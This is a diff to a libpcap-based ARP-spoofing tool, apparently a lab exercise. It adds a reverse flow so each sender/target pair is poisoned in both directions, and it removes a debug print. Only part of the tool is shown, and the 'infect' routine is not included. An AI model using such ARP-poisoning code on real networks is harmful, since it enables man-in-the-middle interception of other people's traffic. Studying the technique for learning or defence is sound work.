@@ -73,9 +73,7 @@ bool resolveMac(pcap_t* handle, Mac myMac, Ip myIp, Ip TIp, Mac& resultMac) {
 
         ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
         if (arp->op() != ArpHdr::Reply) continue;
-	if (arp->sip() != TIp) continue;
-
-	printf("arp reply detected\n\n");
+    	if (arp->sip() != TIp) continue;
 
         resultMac = arp->smac();
         return true;
@@ -141,19 +139,13 @@ int main(int argc, char* argv[]) {
     close(fd);
 
     Flow* head = nullptr;
+    Mac SMac, TMac;
     
     for (int i = 2; i < argc; i += 2) {
         Ip SIp(argv[i]);
         Ip TIp(argv[i + 1]);
 
-        Flow* flow = new Flow;
-        flow->SIp = SIp;
-        flow->SMac = Mac::nullMac();
-        flow->TIp = TIp;
-        flow->TMac = Mac::nullMac();
-        flow->next = nullptr;
-
-        if (!resolveMac(handle, myMac, myIp, flow->SIp, flow->SMac)) {
+        if (!resolveMac(handle, myMac, myIp, SIp, SMac)) {
             printf("failed to resolve sender mac: %s\n", argv[i]);
 
             while (head != nullptr) {
@@ -162,12 +154,11 @@ int main(int argc, char* argv[]) {
                 head = next;
             }
 
-            delete flow;
             pcap_close(handle);
             return -1;
         }
 
-        if (!resolveMac(handle, myMac, myIp, flow->TIp, flow->TMac)) {
+        if (!resolveMac(handle, myMac, myIp, TIp, TMac)) {
             printf("failed to resolve target mac: %s\n", argv[i + 1]);
 
             while (head != nullptr) {
@@ -176,11 +167,24 @@ int main(int argc, char* argv[]) {
                 head = next;
             }
 
-            delete flow;
             pcap_close(handle);
             return -1;
         }
 
+        Flow* flow2 = new Flow;
+        flow2->SIp = TIp;
+        flow2->SMac = TMac;
+        flow2->TIp = SIp;
+        flow2->TMac = SMac;
+        flow2->next = nullptr;
+
+        Flow* flow = new Flow;
+        flow->SIp = SIp;
+        flow->SMac = SMac;
+        flow->TIp = TIp;
+        flow->TMac = TMac;
+        flow->next = flow2;
+        
         if (head == nullptr) {
             head = flow;
         } else {
@@ -191,6 +195,7 @@ int main(int argc, char* argv[]) {
         }
 
         infect(handle, flow, myMac);
+        infect(handle, flow2, myMac);
     }
 
     int cnt = 0;
